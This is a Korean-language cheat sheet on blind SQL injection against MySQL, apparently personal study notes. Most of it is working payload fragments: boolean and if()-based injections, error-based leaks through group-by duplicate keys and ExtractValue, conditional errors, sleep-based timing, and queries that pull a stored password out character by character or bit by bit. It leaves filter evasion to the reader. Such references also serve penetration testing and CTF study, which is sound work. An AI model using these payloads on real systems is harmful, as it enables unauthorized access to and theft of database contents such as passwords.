# Blind sql injection

## 기본 틀 짜기

### 화면으로 참 거짓은 구분할 수 없을 때

내가 원하는 statement의 결과에 따라 화면에 보여지는 결과가 다르게 나오도록 인젝션 구문을  만들면 된다.

```sql
select * from table where id=if(statement, 1,2)
```

```sql
select * from table where id=0 or statement
```

### 화면으로 결과를 알 수 없으나 error가 보일 때

#### group-by infoleak

```sql
select * from table where col=1 in (select min(@:=1)from (select 1 union select 2)k group by concat(version(),@:=@-1));
```

`ERROR 1062 (23000): Duplicate entry '5.5.38-0ubuntu0.12.04.10' for key 'group_key'`

#### xpath infoleak

```sql
select * from table where col=1 and ExtractValue(1, concat(0x5c, (select @@version)))
```

`ERROR 1105 (HY000): XPATH syntax error: '\5.5.38-0ubuntu0.12.04.1'`

constant에 대해서만 수행한다는 약점이 있다.

> mysql의 constant 정의는 좀 신박한데 자세한 내용에 대해서는 [이곳](http://dev.mysql.com/doc/internals/en/optimizer-constants-constant-tables.html) 참조. 일반적인 select 구문에 대해서는 문제없다고 생각해도 좋으나 해당 테이블의 컬럼을 바로 참조할 수는 없음 

#### error-based blind sql injection

mysql은 쿼리를 대체로 eager하게 evaluate하기 때문에 조건부로 에러가 나는 경우가 잘 없지만 몇몇 예외 케이스들이 있다. statement 자리에 원하는 조건문을 넣고 error의 여부로 참거짓을 판단. 

* more than one row error

```sql
select * from table where col=if(statement, (select 1 union select 2), 0);
```

```sql
select * from table where col=if(statement, (select 1 from information_schema.tables), 0);
```

* overflow

```sql
select * from table where col=if(statement, pow(50,500), 0);
```

* regexp

```sql
select * from table where name=if(statement, (1 regexp 0x28), 0);
```

### error도 안 보일 때

#### time-based blind sql injection

statement 자리에 원하는 조건문을 넣고 response time을 재서 참거짓을 판단.

* sleep

```sql
select * from table where col=if(statement, sleep(3), 0);
```

그 밖에 benchmark를 활용하는 방법도 있지만 경험상 딱히 쓸 일이 생겼던 적은 없었다.

## 조건문 만들기

### 기본 

string으로 된 value를 빼낸다고 했을 때 대체로 한 글자씩 맞추는 방법을 쓰게 된다.

```sql
(mid((select password from table limit 1),index,1)=='a')
```
이건 어떤 target의 `index`번째 글자가 `'a'`인지를 알려주는 대표적인 조건문.

변형은 많이 있다. 대표적으로 아래와 같은 경우..

```sql
(select password from table limit 1)>0x61
(select password from table limit 1)>0x6162
(select password from table limit 1)>0x616265
...
```
이건 부등호를 통한 string comparision을 이용한 것이다. 주로 필터링이 많이 되어 있을 때 씀.

### 응용

위처럼 무식하게 하나씩 해보면서 맞추면 후보군이 알파벳 소문자뿐이라고 해도 한 글자당 26번의 쿼리가 소요된다. 그러나 아스키 코드 한 글자는 8비트이므로 비트 단위로 맞추면 쿼리를 8번만 해도 한 글자를 맞출 수 있다.

```sql
(substr(lpad(bin(ascii(substr(target, i, 1))),8,0), j, 1) = 0x31)
```

물론 이게 싫다면 binary search를 해도 되지만 아마 그게 더 귀찮을 것이다..

## 주의

모든 쿼리는 filter evasion을 고려 안하고 만들어졌으며 읽는이가 알아서 해야 함
